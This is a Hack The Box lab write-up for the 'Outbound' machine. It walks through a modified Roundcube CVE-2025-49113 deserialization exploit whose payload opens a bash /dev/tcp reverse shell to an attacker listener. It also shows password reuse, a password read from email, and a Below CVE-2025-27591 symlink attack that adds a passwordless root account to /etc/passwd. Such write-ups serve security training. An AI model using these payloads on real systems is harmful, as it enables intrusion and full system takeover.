---
tags:
  - ctf
  - hbwj
platform: htb
os: linux
---
# HTB Outbound

## Overview
- **Machine**: Outbound
- **OS**: Ubuntu 24.04.2 LTS (Noble Numbat)
- **Attack Path**: Roundcube RCE → Docker Container → SSH to Host → Below Privilege Escalation

This box demonstrates a realistic attack chain involving webmail exploitation, container escape considerations, and a privilege escalation through a monitoring tool vulnerability.

## Enumeration

Initial nmap scan revealed minimal attack surface:

```bash
# Fast TCP scan
nmap -sC -sV -oN nmap_tcp.nmap 10.10.11.77

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0f:24:b8:9f:9f:c0:b5:4f:89:d2:7f:29:8f:d7:e4:9f (ECDSA)
|_  256 0f:24:b8:9f:9f:c0:b5:4f:89:d2:7f:29:8f:d7:e4:9f (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Roundcube Webmail :: Welcome to Roundcube Webmail
|_http-server-header: Apache/2.4.58 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

# UDP scan (top 20 ports)
nmap -sU --top-ports 20 -oN nmap_udp.nmap 10.10.11.77
# All ports filtered or closed
```

The limited services and Roundcube Webmail presence suggested focusing on the web application.

## Initial Foothold

### Roundcube Exploitation - CVE-2025-49113

With provided credentials (tyler / LhKL1o9Nm3X2), we accessed Roundcube Webmail version 1.6.10. Research revealed CVE-2025-49113, a PHP deserialization vulnerability in the file upload functionality.

The vulnerability exists in the `_from` parameter in `/program/actions/settings/upload.php`. When uploading a file, the filename is not properly validated and can contain a PHP serialized object that gets deserialized, leading to RCE.

#### Exploit Development

The initial public exploit failed with errors. Investigation revealed the issue:

```python
# Original exploit used base32 encoding
payload = base32.b32encode(command.encode()).decode()
cmd = f"echo {payload} | base32 -d | bash"
```

The target system didn't have the `base32` command installed. Modified exploit to use direct command injection:

```python
# Working payload structure
payload = f'|O:16:"Crypt_GPG_Engine":3:{{s:8:"_process";b:0;s:8:"_gpgconf";s:{len(command)}:"{command}";s:8:"_homedir";s:0:"";}}}};'

# Direct reverse shell command
command = "bash -c 'bash -i >& /dev/tcp/10.10.16.2/4444 0>&1'"
```

Exploitation steps:
1. Login to Roundcube with tyler's credentials
2. Navigate to Settings → Preferences → Displaying Messages
3. Execute modified exploit with malicious filename parameter
4. Obtain reverse shell as www-data

## Privilege Escalation

### Container Environment Discovery

Initial enumeration as www-data revealed we were in a Docker container:

```bash
www-data@mail:/$ hostname
mail.outbound.htb

www-data@mail:/$ cat /proc/1/cgroup
0::/docker/[container_id]

www-data@mail:/$ ls -la /.dockerenv
-rwxr-xr-x 1 root root 0 Jun  7 13:52 /.dockerenv
```

### Lateral Movement to Tyler

Using the known password:

```bash
www-data@mail:/$ su tyler
Password: LhKL1o9Nm3X2
tyler@mail:/$ id
uid=1000(tyler) gid=1000(tyler) groups=1000(tyler)
```

### Critical Discovery - Jacob's Password in Email

As tyler, we discovered jacob had a mail directory. Reading his emails revealed crucial information:

```bash
tyler@mail:/$ cd /home/jacob/mail
tyler@mail:/home/jacob/mail$ cat /var/mail/jacob

From tyler@outbound.htb  Sat Jun  7 14:00:58 2025
Return-Path: <tyler@outbound.htb>
X-Original-To: jacob
Delivered-To: jacob@outbound.htb
Subject: Important Update

Due to the recent change of policies your password has been changed.

Please use the following credentials to log into your account: gY4Wr3a1evp4

Remember to change your password when you next log into your account.

Thanks!

Tyler
```

This email from Tyler to Jacob contained Jacob's new password: `gY4Wr3a1evp4`

### Container Escape - The Simple Solution

Initially considered complex pivoting with chisel or SSH tunneling. However, testing revealed jacob's credentials worked directly on the host:

```bash
# From attacker machine
ssh jacob@10.10.11.77
Password: gY4Wr3a1evp4

jacob@outbound:~$ cat user.txt
25aae26531fe5f910c36d18a325edf00
```

This bypassed the need for any container escape techniques!

### Root Escalation - CVE-2025-27591

Checking sudo privileges revealed interesting permissions:

```bash
jacob@outbound:~$ sudo -l
User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below --help
    (ALL : ALL) NOPASSWD: /usr/bin/below record
    (ALL : ALL) NOPASSWD: !/usr/bin/below * --config *
    (ALL : ALL) NOPASSWD: !/usr/bin/below * --debug *
    (ALL : ALL) NOPASSWD: !/usr/bin/below * -d *
```

Below is a system monitoring tool. Version check revealed:

```bash
jacob@outbound:~$ below --version
below 0.8.1
```

Research identified CVE-2025-27591, affecting Below versions < v0.9.0. The vulnerability:
- Below creates `/var/log/below` directory with world-writable permissions (777)
- The service writes error logs as root without proper symlink validation
- This allows symlink attacks to write to arbitrary files as root

#### Exploitation Process

```bash
# Verify the vulnerability
jacob@outbound:~$ ls -ld /var/log/below
drwxrwxrwx 2 root root 4096 Aug  5 22:05 /var/log/below

# Create symlink to /etc/passwd
jacob@outbound:~$ cd /var/log/below
jacob@outbound:/var/log/below$ ln -sf /etc/passwd error_root.log

# Trigger Below to write logs as root
jacob@outbound:/var/log/below$ sudo /usr/bin/below record &
[1] 2451

# Wait for log write
jacob@outbound:/var/log/below$ sleep 2
jacob@outbound:/var/log/below$ pkill -f below

# Append passwordless root user
jacob@outbound:/var/log/below$ echo 'attacker::0:0:attacker:/root:/bin/bash' >> error_root.log

# Switch to root
jacob@outbound:/var/log/below$ su attacker
root@outbound:/var/log/below# id
uid=0(root) gid=0(root) groups=0(root)

root@outbound:/var/log/below# cat /root/root.txt
30dfe389d82dc46d6002c61053d0a0de
```

## Technical Details

### Roundcube CVE-2025-49113
- **Affected Version**: Roundcube 1.6.10
- **Vulnerability Type**: PHP Object Deserialization
- **Attack Vector**: Malicious filename in file upload
- **Impact**: Remote Code Execution as www-data

### Below CVE-2025-27591
- **Affected Versions**: Below < v0.9.0
- **Vulnerability Type**: Insecure file permissions + symlink following
- **Attack Vector**: World-writable log directory
- **Impact**: Privilege escalation to root

## Attack Chain Summary

1. **Initial Access**: Roundcube webmail login with provided credentials
2. **RCE**: CVE-2025-49113 exploitation (modified to remove base32 dependency)
3. **Container Access**: Shell as www-data in Docker container
4. **Lateral Movement**: su to tyler, then read jacob's email for password
5. **Container Bypass**: Direct SSH to host with jacob's credentials
6. **Privilege Escalation**: CVE-2025-27591 in Below monitoring tool
7. **Root Access**: Symlink attack on world-writable log directory

## Lessons Learned

1. **Password in Emails**: System administrators sometimes send passwords via email - always check mail directories
2. **Container Assumptions**: Don't assume complex escape techniques - try credentials on host services first
3. **Exploit Dependencies**: Public exploits may use unnecessary tools (base32) - simplify when possible
4. **World-Writable Directories**: Combined with privileged processes, these remain a critical vulnerability
5. **Sudo Restrictions**: Even with path restrictions, vulnerable software versions can be exploited
6. **Monitoring Tools**: System monitoring software often runs with elevated privileges - prime targets

The box effectively demonstrates a complete attack chain from web application compromise through container considerations to privilege escalation via third-party software vulnerabilities.
